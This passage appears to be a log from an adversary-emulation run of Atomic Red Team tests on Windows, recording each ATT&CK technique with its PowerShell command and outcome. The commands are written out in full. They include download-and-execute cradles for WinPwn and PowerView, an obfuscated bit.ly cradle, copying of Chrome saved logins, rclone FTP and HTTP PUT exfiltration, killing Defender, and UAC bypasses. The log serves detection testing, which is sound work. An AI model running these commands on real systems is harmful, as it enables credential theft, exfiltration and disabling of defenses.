            'technique_id': 'T1059.001',
            'technique_name': 'Command and Scripting Interpreter: PowerShell'},
 'command': 'Try {;     New-PSSession -ComputerName $env:COMPUTERNAME '
            '-ErrorAction Stop | Out-Null;      ; } ; Catch {;     '
            'Enable-PSRemoting; };  ;  New-PSSession -ComputerName '
            '$env:COMPUTERNAME; Test-Connection $env:COMPUTERNAME; Set-Content '
            '-Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use -Value '
            '"T1086 PowerShell Session Creation and Use"; Get-Content -Path '
            '$env:TEMP\\T1086_PowerShell_Session_Creation_and_Use; Remove-Item '
            '-Force $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use',
 'delegated': '2023-11-28T07:58:40Z',
 'description': 'Connect to a remote powershell session and interact with the '
                'host.\n'
                "Upon execution, network test info and 'T1086 PowerShell "
                "Session Creation and Use' will be displayed.\n",
 'executor': 'psh',
 'link_id': '2eb02348-b5c6-497e-87d3-25a51436c0e6',
 'name': 'PowerShell Session Creation and Use',
 'pid': 8432,
 'plaintext_command': 'Try {;     New-PSSession -ComputerName '
                      '$env:COMPUTERNAME -ErrorAction Stop | Out-Null;      ; '
                      '} ; Catch {;     Enable-PSRemoting; };  ;  '
                      'New-PSSession -ComputerName $env:COMPUTERNAME; '
                      'Test-Connection $env:COMPUTERNAME; Set-Content -Path '
                      '$env:TEMP\\T1086_PowerShell_Session_Creation_and_Use '
                      '-Value "T1086 PowerShell Session Creation and Use"; '
                      'Get-Content -Path '
                      '$env:TEMP\\T1086_PowerShell_Session_Creation_and_Use; '
                      'Remove-Item -Force '
                      '$env:TEMP\\T1086_PowerShell_Session_Creation_and_Use',
 'platform': 'windows',
 'run': '2023-11-28T07:59:28Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1053_005__multiple__scheduled_task,job-_scheduled_task__4150ef18184112953ae5742a3f8de64e__trial_1

atomic_ordering: ['4150ef18184112953ae5742a3f8de64e']
------------------------------
{'ability_id': '4150ef18184112953ae5742a3f8de64e',
 'agent_reported_time': '2023-11-11T13:09:19Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1053.005',
            'technique_name': 'Scheduled Task/Job: Scheduled Task'},
 'command': '$Action = New-ScheduledTaskAction -Execute "cmd.exe"; $Trigger = '
            'New-ScheduledTaskTrigger -AtLogon; $User = '
            'New-ScheduledTaskPrincipal -GroupId "BUILTIN\\Administrators" '
            '-RunLevel Highest; $Set = New-ScheduledTaskSettingsSet; $object = '
            'New-ScheduledTask -Action $Action -Principal $User -Trigger '
            '$Trigger -Settings $Set; Register-ScheduledTask AtomicTaskModifed '
            '-InputObject $object; $NewAction = New-ScheduledTaskAction '
            '-Execute "Notepad.exe"; Set-ScheduledTask "AtomicTaskModifed" '
            '-Action $NewAction',
 'delegated': '2023-11-27T22:35:47Z',
 'description': 'Create a scheduled task with an action and modify the action '
                'to do something else. The initial idea is to showcase '
                'Microsoft Windows TaskScheduler Operational log modification '
                'of an action on a Task already registered. \n'
                'It will first be created to spawn cmd.exe, but modified to '
                'run notepad.exe.\n'
                '\n'
                'Upon successful execution, powershell.exe will create a '
                'scheduled task and modify the action. \n',
 'executor': 'psh',
 'link_id': '84ff5355-e003-4c1f-9ef7-32cd55c472cc',
 'name': 'PowerShell Modify A Scheduled Task',
 'pid': 11120,
 'plaintext_command': '$Action = New-ScheduledTaskAction -Execute "cmd.exe"; '
                      '$Trigger = New-ScheduledTaskTrigger -AtLogon; $User = '
                      'New-ScheduledTaskPrincipal -GroupId '
                      '"BUILTIN\\Administrators" -RunLevel Highest; $Set = '
                      'New-ScheduledTaskSettingsSet; $object = '
                      'New-ScheduledTask -Action $Action -Principal $User '
                      '-Trigger $Trigger -Settings $Set; '
                      'Register-ScheduledTask AtomicTaskModifed -InputObject '
                      '$object; $NewAction = New-ScheduledTaskAction -Execute '
                      '"Notepad.exe"; Set-ScheduledTask "AtomicTaskModifed" '
                      '-Action $NewAction',
 'platform': 'windows',
 'run': '2023-11-27T22:36:05Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__fff25debffb3645d82c89632750497a1__trial_1

atomic_ordering: ['fff25debffb3645d82c89632750497a1']
------------------------------
{'ability_id': 'fff25debffb3645d82c89632750497a1',
 'agent_reported_time': '2023-11-11T13:09:58Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1555.003',
            'technique_name': 'Credentials from Password Stores: Credentials '
                              'from Web Browsers'},
 'command': 'Copy-Item "$env:LOCALAPPDATA\\Google\\Chrome\\User '
            'Data\\Default\\Login Data" -Destination '
            '"PathToAtomicsFolder\\..\\ExternalPayloads"; Copy-Item '
            '"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login '
            'Data For Account" -Destination '
            '"PathToAtomicsFolder\\..\\ExternalPayloads"',
 'delegated': '2023-12-03T00:50:16Z',
 'description': 'Simulates an adversary accessing encrypted credentials from '
                'Google Chrome Login database. \n',
 'executor': 'psh',
 'link_id': '5267e574-3982-46e3-af29-a7b5e2638240',
 'name': 'Simulating access to Chrome Login Data',
 'pid': 8176,
 'plaintext_command': 'Copy-Item "$env:LOCALAPPDATA\\Google\\Chrome\\User '
                      'Data\\Default\\Login Data" -Destination '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads"; Copy-Item '
                      '"$env:LOCALAPPDATA\\Google\\Chrome\\User '
                      'Data\\Default\\Login Data For Account" -Destination '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads"',
 'platform': 'windows',
 'run': '2023-12-03T00:50:21Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1048_003__exfiltration__exfiltration_over_alternative_protocol-_exfiltration_over_unencrypted,obfuscated_non-c2_protocol__3f73be176cadf2762623b3117e25335d__trial_1

atomic_ordering: ['3f73be176cadf2762623b3117e25335d']
------------------------------
{'ability_id': '3f73be176cadf2762623b3117e25335d',
 'agent_reported_time': '2023-11-11T13:09:12Z',
 'attack': {'tactic': 'exfiltration',
            'technique_id': 'T1048.003',
            'technique_name': 'Exfiltration Over Alternative Protocol: '
                              'Exfiltration Over Unencrypted/Obfuscated Non-C2 '
                              'Protocol'},
 'command': '$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ '
            '-Recurse -Include "rclone.exe" | Select-Object -ExpandProperty '
            'FullName; $exfil_pack = Get-ChildItem '
            'C:\\Users\\Public\\Downloads\\ -Recurse -Include "exfil.zip" | '
            'Select-Object -ExpandProperty FullName; &$rclone_bin config '
            'create ftpserver "ftp" "host"; &$rclone_bin copy --max-age 2y '
            '$exfil_pack ftpserver --bwlimit 2M -q --ignore-existing '
            '--auto-confirm --multi-thread-streams 12 --transfers 12 -P '
            '--ftp-no-check-certificate',
 'delegated': '2023-11-27T20:02:45Z',
 'description': 'Rclone may be used by an adversary to exfiltrate data to a '
                'publicly hosted FTP server.\n'
                '[Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)',
 'executor': 'psh',
 'link_id': '85163a3d-3a53-427c-a7aa-360d2b965c81',
 'name': 'Exfiltration Over Alternative Protocol - FTP - Rclone',
 'pid': 60,
 'plaintext_command': '$rclone_bin = Get-ChildItem '
                      'C:\\Users\\Public\\Downloads\\ -Recurse -Include '
                      '"rclone.exe" | Select-Object -ExpandProperty FullName; '
                      '$exfil_pack = Get-ChildItem '
                      'C:\\Users\\Public\\Downloads\\ -Recurse -Include '
                      '"exfil.zip" | Select-Object -ExpandProperty FullName; '
                      '&$rclone_bin config create ftpserver "ftp" "host"; '
                      '&$rclone_bin copy --max-age 2y $exfil_pack ftpserver '
                      '--bwlimit 2M -q --ignore-existing --auto-confirm '
                      '--multi-thread-streams 12 --transfers 12 -P '
                      '--ftp-no-check-certificate',
 'platform': 'windows',
 'run': '2023-11-27T20:03:25Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1046__discovery__network_service_discovery__bc34d6834bdf568e206627f7809a556f__trial_1

atomic_ordering: ['bc34d6834bdf568e206627f7809a556f']
------------------------------
{'ability_id': 'bc34d6834bdf568e206627f7809a556f',
 'agent_reported_time': '2023-11-11T13:08:59Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1046',
            'technique_name': 'Network Service Discovery'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'spoolvulnscan -noninteractive -consoleoutput',
 'delegated': '2023-11-27T19:05:10Z',
 'description': 'Start MS-RPRN RPC Service Scan using spoolvulnscan function '
                'of WinPwn',
 'executor': 'psh',
 'link_id': '6771d63e-1eab-4344-a963-ede1ae69fc64',
 'name': 'WinPwn - spoolvulnscan',
 'pid': 764,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'spoolvulnscan -noninteractive -consoleoutput',
 'platform': 'windows',
 'run': '2023-11-27T19:05:22Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1176__persistence__browser_extensions__70f8b4c0be2ee69f07592eee0aa5acc0__trial_1

atomic_ordering: ['70f8b4c0be2ee69f07592eee0aa5acc0']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1552_001__credential-access__unsecured_credentials-_credentials_in_files__ac7757ba58f423fa808b4b6f115cc613__trial_1

atomic_ordering: ['ac7757ba58f423fa808b4b6f115cc613']
------------------------------
{'ability_id': 'ac7757ba58f423fa808b4b6f115cc613',
 'agent_reported_time': '2023-11-11T13:10:05Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1552.001',
            'technique_name': 'Unsecured Credentials: Credentials In Files'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'SharpCloud -consoleoutput -noninteractive',
 'delegated': '2023-12-02T15:26:05Z',
 'description': 'Loot local Credentials - AWS, Microsoft Azure, and Google '
                'Compute credentials technique via function of WinPwn',
 'executor': 'psh',
 'link_id': '90ab314a-ad77-4c22-97b3-0d8d8290193a',
 'name': 'WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google '
         'Compute credentials',
 'pid': 9672,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'SharpCloud -consoleoutput -noninteractive',
 'platform': 'windows',
 'run': '2023-12-02T15:26:23Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1020__exfiltration__automated_exfiltration__305c23215a4bf6184ed701b5ca1d1af7__trial_1

atomic_ordering: ['305c23215a4bf6184ed701b5ca1d1af7']
------------------------------
{'ability_id': '305c23215a4bf6184ed701b5ca1d1af7',
 'agent_reported_time': '2023-11-11T13:10:18Z',
 'attack': {'tactic': 'exfiltration',
            'technique_id': 'T1020',
            'technique_name': 'Automated Exfiltration'},
 'command': '$fileName = "C:\\temp\\T1020_exfilFile.txt"; $url = '
            '"https://google.com"; $file = New-Item -Force $fileName -Value '
            '"This is ART IcedID Botnet Exfil Test"; $contentType = '
            '"application/octet-stream"; try {Invoke-WebRequest -Uri $url '
            '-Method Put -ContentType $contentType -InFile $fileName} catch{}',
 'delegated': '2023-11-27T08:43:12Z',
 'description': 'Creates a text file\n'
                'Tries to upload to a server via HTTP PUT method with '
                'ContentType Header\n'
                'Deletes a created file',
 'executor': 'psh',
 'link_id': '194a7af2-3e37-49c0-b01c-75fdd2c6620e',
 'name': 'IcedID Botnet HTTP PUT',
 'pid': 6340,
 'plaintext_command': '$fileName = "C:\\temp\\T1020_exfilFile.txt"; $url = '
                      '"https://google.com"; $file = New-Item -Force $fileName '
                      '-Value "This is ART IcedID Botnet Exfil Test"; '
                      '$contentType = "application/octet-stream"; try '
                      '{Invoke-WebRequest -Uri $url -Method Put -ContentType '
                      '$contentType -InFile $fileName} catch{}',
 'platform': 'windows',
 'run': '2023-11-27T08:43:50Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1135__discovery__network_share_discovery__4b325a29e936cd1ccac2292bc92a31b5__trial_1

atomic_ordering: ['4b325a29e936cd1ccac2292bc92a31b5']
------------------------------
{'ability_id': '4b325a29e936cd1ccac2292bc92a31b5',
 'agent_reported_time': '2023-11-11T13:09:00Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1135',
            'technique_name': 'Network Share Discovery'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
            "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' "
            '-UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose',
 'delegated': '2023-11-30T09:50:15Z',
 'description': 'Enumerate Domain Shares the current user has access. Upon '
                'execution, progress info about each share being scanned will '
                'be displayed.\n',
 'executor': 'psh',
 'link_id': '26cd7485-0e5d-4b67-9827-3a9449313559',
 'name': 'Share Discovery with PowerView',
 'pid': 10472,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
                      "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' "
                      '-UseBasicParsing); Find-DomainShare -CheckShareAccess '
                      '-Verbose',
 'platform': 'windows',
 'run': '2023-11-30T09:50:59Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1553_004__defense-evasion__subvert_trust_controls-_install_root_certificate__2cdcf1010a524231a26b5f3c6025eb91__trial_1

atomic_ordering: ['2cdcf1010a524231a26b5f3c6025eb91']
------------------------------
{'ability_id': '2cdcf1010a524231a26b5f3c6025eb91',
 'agent_reported_time': '2023-11-11T13:10:16Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1553.004',
            'technique_name': 'Subvert Trust Controls: Install Root '
                              'Certificate'},
 'command': 'certutil -addstore my $env:Temp\\rootCA2.cer',
 'delegated': '2023-12-02T19:01:00Z',
 'description': 'Creates a root CA with certutil\n',
 'executor': 'psh',
 'link_id': '30fb990f-0975-423a-8a85-7e583af79e2c',
 'name': 'Install root CA on Windows with certutil',
 'pid': 10248,
 'plaintext_command': 'certutil -addstore my $env:Temp\\rootCA2.cer',
 'platform': 'windows',
 'run': '2023-12-02T19:01:19Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__ef943918da20ee40d378ad000bbcc3b7__trial_1

atomic_ordering: ['ef943918da20ee40d378ad000bbcc3b7']
------------------------------
{'ability_id': 'ef943918da20ee40d378ad000bbcc3b7',
 'agent_reported_time': '2023-11-11T13:09:41Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1059.001',
            'technique_name': 'Command and Scripting Interpreter: PowerShell'},
 'command': '(New-Object '
            "Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))); "
            '(New-Object '
            "Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs(); "
            "Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W "
            "'Net.WebClient';Set-Item Variable:\\gH 'Default_File_Path.ps1';ls "
            '_-*;Set-Variable igZ '
            "(.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem "
            'Variable:0W).Value);Set-Variable J ((((Get-Variable igZ '
            "-ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ "
            '-ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item '
            'Variable:/HJ1).Value,(GV gH).Value);&( '
            "''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT "
            '-Enco 3 (GV gH).Value)))',
 'delegated': '2023-11-28T09:15:04Z',
 'description': 'Different obfuscated methods to test. Upon execution, reaches '
                'out to bit.ly/L3g1t and displays: "SUCCESSFULLY EXECUTED '
                'POWERSHELL CODE FROM REMOTE LOCATION"\n',
 'executor': 'psh',
 'link_id': '31991bd4-e789-4dc4-b1fd-afb0bbfd81d5',
 'name': 'Obfuscation Tests',
 'pid': 5428,
 'plaintext_command': '(New-Object '
                      "Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))); "
                      '(New-Object '
                      "Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs(); "
                      "Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI "
                      "Variable:/0W 'Net.WebClient';Set-Item Variable:\\gH "
                      "'Default_File_Path.ps1';ls _-*;Set-Variable igZ "
                      "(.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem "
                      'Variable:0W).Value);Set-Variable J ((((Get-Variable igZ '
                      "-ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable "
                      'igZ -ValueOn).((ChildItem '
                      'Variable:J).Value).Invoke((Get-Item '
                      'Variable:/HJ1).Value,(GV gH).Value);&( '
                      "''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT "
                      '-Enco 3 (GV gH).Value)))',
 'platform': 'windows',
 'run': '2023-11-28T09:15:13Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1572__command-and-control__protocol_tunneling__45f462c09f28d5b0819af7b1ed0913e1__trial_1

atomic_ordering: ['45f462c09f28d5b0819af7b1ed0913e1']
------------------------------
{'ability_id': '45f462c09f28d5b0819af7b1ed0913e1',
 'agent_reported_time': '2023-11-11T13:10:05Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1572',
            'technique_name': 'Protocol Tunneling'},
 'command': 'Set-Location "PathToAtomicsFolder"; '
            '.\\T1572\\src\\T1572-doh-domain-length.ps1 -DohServer',
 'delegated': '2023-12-03T23:47:05Z',
 'description': 'This test simulates an infected host returning data to a '
                'command and control server using long domain names.\n'
                'The simulation involves sending DoH queries that gradually '
                'increase in length until reaching the maximum length. The '
                'intent is to test the effectiveness of detection of DoH '
                'queries for long domain names over a set threshold.\n'
                ' Upon execution, DNS information about the domain will be '
                'displayed for each callout in a JSON format.\n',
 'executor': 'psh',
 'link_id': 'f99b9f2d-efe8-48b6-b99d-b07c03df923b',
 'name': 'DNS over HTTPS Long Domain Query',
 'pid': 708,
 'plaintext_command': 'Set-Location "PathToAtomicsFolder"; '
                      '.\\T1572\\src\\T1572-doh-domain-length.ps1 -DohServer',
 'platform': 'windows',
 'run': '2023-12-03T23:47:08Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1562_006__defense-evasion__impair_defenses-_indicator_blocking__233bd007622d94ee3019efc6a70d0a83__trial_1

atomic_ordering: ['233bd007622d94ee3019efc6a70d0a83']
==============================
==============================
adversary_id: atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__55fa0d4a61d03d34c0628b6b5343cac7__trial_1

atomic_ordering: ['55fa0d4a61d03d34c0628b6b5343cac7']
------------------------------
{'ability_id': '55fa0d4a61d03d34c0628b6b5343cac7',
 'agent_reported_time': '2023-11-11T13:10:03Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.001',
            'technique_name': 'Impair Defenses: Disable or Modify Tools'},
 'command': '& "PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe" -k '
            '-n MsMpEng.exe',
 'delegated': '2023-12-03T11:10:01Z',
 'description': 'Backstab loads Process Explorer driver which is signed by '
                'Microsoft and use it to terminate running processes protected '
                'by antimalware software such as MsSense.exe or MsMpEng.exe, '
                'which is otherwise not possible to kill.\n'
                'https://github.com/Yaxser/Backstab',
 'executor': 'psh',
 'link_id': 'aaa48aba-c349-45d2-bb89-883830009146',
 'name': 'Kill antimalware protected processes using Backstab',
 'pid': 10224,
 'plaintext_command': '& '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe" '
                      '-k -n MsMpEng.exe',
 'platform': 'windows',
 'run': '2023-12-03T11:10:17Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__c4c471259798dd6c7b0b56f716e12113__trial_1

atomic_ordering: ['c4c471259798dd6c7b0b56f716e12113']
------------------------------
{'ability_id': 'c4c471259798dd6c7b0b56f716e12113',
 'agent_reported_time': '2023-11-11T13:10:09Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1548.002',
            'technique_name': 'Abuse Elevation Control Mechanism: Bypass User '
                              'Account Control'},
 'command': 'Set-ItemProperty '
            'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System '
            '-Name PromptOnSecureDesktop -Value 0 -Type Dword -Force',
 'delegated': '2023-12-02T11:51:55Z',
 'description': 'User Account Control (UAC) is a security mechanism for '
                'limiting the elevation of privileges, including '
                'administrative accounts, unless authorized. \n'
                'This setting ensures that the elevation prompt is only used '
                'in secure desktop mode.\n'
                'Disable User Account Conrol (UAC) for secure desktop by '
                'setting the registry key '
                'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\PromptOnSecureDesktop '
                'to 0.\n',
 'executor': 'psh',
 'link_id': 'ff6e0b26-3001-4a09-b3d1-39da67a68f74',
 'name': 'Disable UAC - Switch to the secure desktop when prompting for '
         'elevation via registry key',
 'pid': 8972,
 'plaintext_command': 'Set-ItemProperty '
                      'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System '
                      '-Name PromptOnSecureDesktop -Value 0 -Type Dword -Force',
 'platform': 'windows',
 'run': '2023-12-02T11:52:28Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1115__collection__clipboard_data__abd5327a47c4994e2824f833eefe4250__trial_1

atomic_ordering: ['abd5327a47c4994e2824f833eefe4250']
------------------------------
{'ability_id': 'abd5327a47c4994e2824f833eefe4250',
 'agent_reported_time': '2023-11-11T13:09:58Z',
 'attack': {'tactic': 'collection',
            'technique_id': 'T1115',
            'technique_name': 'Clipboard Data'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; Set-Clipboard -value "Atomic '
            'T1115 Test, grab data from clipboard via VBA"; IEX (iwr '
            '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
            '-UseBasicParsing); Invoke-Maldoc -macroFile '
            '"PathToAtomicsFolder\\T1115\\src\\T1115-macrocode.txt" '
            '-officeProduct "Word" -sub "GetClipboard"',
 'delegated': '2023-11-30T03:08:21Z',
 'description': "This module copies the data stored in the user's clipboard "
                'and writes it to a file, '
                '$env:TEMP\\atomic_T1115_clipboard_data.txt\n',
 'executor': 'psh',
 'link_id': '797bf1e4-9d79-4f9c-8488-a63832532bfe',
 'name': 'Collect Clipboard Data via VBA',
 'pid': 7444,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; Set-Clipboard -value '
                      '"Atomic T1115 Test, grab data from clipboard via VBA"; '
                      'IEX (iwr '
                      '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
                      '-UseBasicParsing); Invoke-Maldoc -macroFile '
                      '"PathToAtomicsFolder\\T1115\\src\\T1115-macrocode.txt" '
                      '-officeProduct "Word" -sub "GetClipboard"',
 'platform': 'windows',
 'run': '2023-11-30T03:08:32Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1059_003__execution__command_and_scripting_interpreter-_windows_command_shell__942d94dff3cc494bacf5517e775321a7__trial_1

atomic_ordering: ['942d94dff3cc494bacf5517e775321a7']
------------------------------
{'ability_id': '942d94dff3cc494bacf5517e775321a7',
 'agent_reported_time': '2023-11-11T13:09:59Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1059.003',
            'technique_name': 'Command and Scripting Interpreter: Windows '
                              'Command Shell'},
 'command': 'cmd /c "for /l %x in (1,1,75) do start wordpad.exe /p '
            'PathToAtomicsFolder\\..\\ExternalPayloads\\T1059_003note.txt" | '
            'out-null',
 'delegated': '2023-11-28T09:53:53Z',
 'description': 'This test attempts to open a file a specified number of times '
                'in Wordpad, then prints the contents. \n'
                "It is designed to mimic BlackByte ransomware's print bombing "
                'technique, where tree.dll, which contains the ransom note, is '
                'opened in Wordpad 75 times and then printed. \n'
                'See https://redcanary.com/blog/blackbyte-ransomware/. \n',
 'executor': 'psh',
 'link_id': '8179a67f-4c81-42e0-a0d2-edbd3322ddc5',
 'name': 'Simulate BlackByte Ransomware Print Bombing',
 'pid': 6424,
 'plaintext_command': 'cmd /c "for /l %x in (1,1,75) do start wordpad.exe /p '
                      'PathToAtomicsFolder\\..\\ExternalPayloads\\T1059_003note.txt" '
                      '| out-null',
 'platform': 'windows',
 'run': '2023-11-28T09:54:28Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__1bb96a80fd7968839ead470953ffb738__trial_1

atomic_ordering: ['1bb96a80fd7968839ead470953ffb738']
------------------------------
{'ability_id': '1bb96a80fd7968839ead470953ffb738',
 'agent_reported_time': '2023-11-11T13:09:38Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1548.002',
            'technique_name': 'Abuse Elevation Control Mechanism: Bypass User '
                              'Account Control'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'UACBypass -noninteractive -command '
            '"C:\\windows\\system32\\calc.exe" -technique ccmstp',
 'delegated': '2023-12-02T09:55:40Z',
 'description': 'UAC bypass using ccmstp technique via function of WinPwn',
 'executor': 'psh',
 'link_id': 'f233b378-fd4b-4449-b899-4575332e02f8',
 'name': 'WinPwn - UAC Bypass ccmstp technique',
 'pid': 9876,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'UACBypass -noninteractive -command '
                      '"C:\\windows\\system32\\calc.exe" -technique ccmstp',
 'platform': 'windows',
 'run': '2023-12-02T09:55:53Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1018__discovery__remote_system_discovery__681fd384d66be9e180a74e5fecdc4ab6__trial_1

atomic_ordering: ['681fd384d66be9e180a74e5fecdc4ab6']
------------------------------
{'ability_id': '681fd384d66be9e180a74e5fecdc4ab6',
 'agent_reported_time': '2023-11-11T13:10:18Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1018',
            'technique_name': 'Remote System Discovery'},
 'command': '$DirectorySearcher = New-Object '
            'System.DirectoryServices.DirectorySearcher("(ObjectCategory=Computer)"); '
            '$DirectorySearcher.PropertiesToLoad.Add("Name"); $Computers = '
            '$DirectorySearcher.findall(); foreach ($Computer in $Computers) '
            '{;   $Computer = $Computer.Properties.name;   if (!$Computer) { '
            'Continue };   Write-Host $Computer}',
 'delegated': '2023-11-27T07:25:11Z',
 'description': 'This test is a Powershell script that enumerates Active '
                'Directory to determine computers that are joined to the '
